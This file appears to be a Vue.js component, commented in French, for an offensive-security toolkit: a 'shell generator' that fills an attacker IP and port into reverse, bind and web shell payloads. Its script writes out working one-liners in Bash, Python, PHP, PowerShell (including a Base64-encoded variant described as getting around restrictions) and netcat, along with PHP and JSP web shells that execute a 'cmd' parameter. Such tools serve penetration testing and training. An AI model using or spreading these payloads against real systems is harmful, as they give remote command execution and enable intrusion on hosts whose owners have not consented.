<!--
================================================================================
 Fichier : ShellGenerator.vue
 Description :
  Ce composant Vue.js permet de générer dynamiquement des commandes de shells
  interactifs pour divers types d'accès à distance. Il offre des options pour
  générer des shells de type Reverse Shell, Bind Shell et Web Shell en différentes
  langues de programmation.

 Fonctionnalités principales :
  - Interface utilisateur basée sur Vuetify avec un système d'onglets pour
    naviguer entre les différents types de shells.
  - Formulaire de configuration permettant de spécifier une adresse IP et un port.
  - Génération dynamique de commandes pour plusieurs langages :
    - Bash
    - Python
    - PHP
    - PowerShell
    - Netcat
    - JSP
  - Affichage des commandes sous forme de blocs avec explication.
  - Encodage Base64 pour les commandes PowerShell pour éviter certaines
    restrictions de sécurité.
  - Prise en charge de différentes variantes de Netcat (OpenBSD, traditionnel).
  - Web shells en PHP et JSP permettant une exécution de commandes à distance.

 Technologies utilisées :
  - Vue.js 3 (Composition API)
  - Vuetify (composants UI)
  - Computed Properties pour générer dynamiquement les commandes en fonction de
    l'IP et du port saisis.
  - Composant `CodeExample` pour afficher les commandes avec explications.

 Remarque :
  Ce composant est destiné à des usages légaux et pédagogiques, notamment dans
  le cadre de tests de sécurité et de formations en cybersécurité.

 Auteur : Psyko
 Date : 24.02.2025
================================================================================
-->

<template>
  <v-container fluid class="pa-0">
    <v-card class="ma-2">
      <v-card-title class="text-h4 text-center red--text">
        Générateur de Shells
      </v-card-title>

      <v-tabs v-model="currentTab" color="red" align-tabs="center" grow>
        <v-tab value="reverse">
          <v-icon start>mdi-arrow-left-right</v-icon>
          Reverse Shell
        </v-tab>
        <v-tab value="bind">
          <v-icon start>mdi-link-variant</v-icon>
          Bind Shell
        </v-tab>
        <v-tab value="web">
          <v-icon start>mdi-web</v-icon>
          Web Shell
        </v-tab>
      </v-tabs>

      <v-window v-model="currentTab">
        <!-- Reverse Shell -->
        <v-window-item value="reverse">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Configuration -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Configuration
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <v-row>
                        <v-col cols="6">
                          <v-text-field v-model="ipAddress" label="IP de l'attaquant"
                            placeholder="192.168.1.100"></v-text-field>
                        </v-col>
                        <v-col cols="6">
                          <v-text-field v-model="port" label="Port" placeholder="4444"></v-text-field>
                        </v-col>
                      </v-row>
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Bash -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Bash
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="Bash TCP" :code="bashTcp"
                        explanation="Shell bash utilisant /dev/tcp. Nécessite que /dev/tcp soit disponible." />
                      <CodeExample title="Bash UDP" :code="bashUdp"
                        explanation="Version UDP du shell bash. Utile si TCP est filtré." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <!-- Python -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Python
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="Python3" language="python" :code="python3Shell"
                        explanation="Shell Python3 avec redirection des descripteurs de fichiers." />
                      <CodeExample title="Python One-liner court" language="python" :code="pythonOneLiner"
                        explanation="Version plus courte avec PTY pour un shell plus stable." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <!-- PHP -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      PHP
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="PHP Exec" language="php" :code="phpExec"
                        explanation="Shell PHP utilisant exec(). Alternative : system() ou passthru()." />
                      <CodeExample title="PHP Shell" language="php" :code="phpShell"
                        explanation="Version plus élaborée utilisant proc_open pour un meilleur contrôle." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <!-- PowerShell -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      PowerShell
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="PowerShell TCP" language="powershell" :code="psTcp"
                        explanation="Shell PowerShell complet avec gestion des erreurs et prompt personnalisé." />
                      <CodeExample title="PowerShell Base64" language="powershell" :code="psBase64"
                        explanation="Version encodée en Base64 pour contourner certaines restrictions." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Bind Shell -->
        <v-window-item value="bind">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Python Bind Shell -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Python
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="Python3 Bind Shell" language="python" :code="pythonBind"
                        explanation="Crée un serveur qui écoute sur le port spécifié et donne un shell à la première connexion." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <!-- Netcat -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Netcat
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="Netcat Traditionnel" :code="ncTrad"
                        explanation="Version traditionnelle avec l'option -e (non disponible sur toutes les versions)." />
                      <CodeExample title="Netcat OpenBSD" :code="ncOpenBSD"
                        explanation="Pour les versions de netcat sans l'option -e (comme OpenBSD)." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Web Shell -->
        <v-window-item value="web">
          <v-card flat>
            <v-card-text>
              <v-list>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      PHP
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="PHP Simple" language="php" :code="phpSimple"
                        explanation="Simple web shell utilisant le paramètre GET/POST 'cmd'. Usage: http://target/shell.php?cmd=id" />
                      <CodeExample title="PHP avec Interface" language="php" :code="phpInterface"
                        explanation="Web shell avec interface utilisateur simple pour exécuter des commandes." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <!-- JSP Web Shell -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      JSP
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample title="JSP Shell" language="jsp" :code="jspShell"
                        explanation="Web shell JSP pour les serveurs Java. Usage similaire au PHP." />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>
      </v-window>
    </v-card>
  </v-container>
</template>

<script setup>
import { ref, computed } from 'vue'
import CodeExample from '@/components/CodeExample.vue'

const currentTab = ref('reverse')
const ipAddress = ref('')
const port = ref('4444')


const bashTcp = computed(() =>
  `bash -i >& /dev/tcp/${ipAddress.value}/${port.value} 0>&1`
)
const bashUdp = computed(() =>
  `sh -i >& /dev/udp/${ipAddress.value}/${port.value} 0>&1`
)


const python3Shell = computed(() =>
  `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ipAddress.value}",${port.value}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
)
const pythonOneLiner = computed(() =>
  `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ipAddress.value}",${port.value}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
)


const phpExec = computed(() =>
  `php -r '$sock=fsockopen("${ipAddress.value}",${port.value});exec("/bin/sh -i <&3 >&3 2>&3");'`
)
const phpShell = computed(() =>
  `<?php
$sock=fsockopen("${ipAddress.value}",${port.value});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>`
)


const psTcp = computed(() =>
  `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ipAddress.value}",${port.value});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
)
const psBase64 = computed(() => {
  const cmd = `$client = New-Object System.Net.Sockets.TCPClient('${ipAddress.value}',${port.value});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
};
$client.Close()`
  return `powershell -e ${btoa(cmd)}`
})


const pythonBind = computed(() =>
  `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",${port.value}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
)


const ncTrad = computed(() =>
  `nc -lvp ${port.value} -e /bin/bash`
)
const ncOpenBSD = computed(() =>
  `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp ${port.value} > /tmp/f`
)


const phpSimple = computed(() =>
  `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
)
const phpInterface = computed(() =>
  `<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="POST">
  <input type="text" name="cmd" style="width:100%;height:25px" placeholder="Commande...">
  <input type="submit" value="Exécuter">
</form>
</body>
</html>`
)


const jspShell = computed(() =>
  `<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>
<form method="GET">
  <input type="text" name="cmd" size="50">
  <input type="submit" value="Run">
</form>`
)
</script>

<style scoped>
.v-list-item-subtitle {
  white-space: pre-line !important;
  display: block !important;
  color: rgba(255, 255, 255, 0.7) !important;
  margin-top: 8px !important;
  padding: 8px !important;
  font-size: 14px !important;
}

.v-list-item-content {
  display: block !important;
  width: 100% !important;
}

.v-list-item {
  display: block !important;
  padding: 16px !important;
  margin-bottom: 8px !important;
  background-color: rgba(0, 0, 0, 0.2) !important;
  border-radius: 4px !important;
}

.v-tab {
  text-transform: none !important;
}

.font-weight-bold {
  font-weight: bold !important;
  color: white !important;
  margin-bottom: 4px !important;
  display: inline-block !important;
}

.mt-2 {
  margin-top: 12px !important;
}

.v-divider {
  margin: 16px 0 !important;
  opacity: 0.2 !important;
}

.text-h6 {
  color: white !important;
  font-size: 1.25rem !important;
  font-weight: 500 !important;
  margin-bottom: 8px !important;
}
</style>
